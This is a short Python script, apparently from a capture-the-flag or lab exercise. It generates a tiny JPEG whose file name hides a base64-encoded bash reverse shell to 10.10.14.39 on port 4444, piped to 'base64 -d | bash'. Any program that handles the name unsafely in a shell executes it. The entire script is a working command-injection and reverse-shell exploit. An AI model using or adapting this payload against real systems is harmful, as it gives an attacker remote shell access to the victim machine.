#!/usr/bin/python3
import base64

def status(msg):
    print(f"[*] {msg}")

def generateExploit(ip, port):
    status("Generating payload ....")
    cmd = bytes(f'/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1','UTF-8')
    encodedName = base64.b64encode(cmd)
    image = b"/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEBAgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/yQALCAABAAEBAREA/8wABgAQEAX/2gAIAQEAAD8A0s8g/9k="
    imageName = f"echo {encodedName.decode()} | base64 -d | bash |"
    with open(imageName, "wb") as img:
        img.write(base64.decodebytes(image))
    status(f"Payload generated and saved as '{imageName}'")


generateExploit("10.10.14.39", 4444)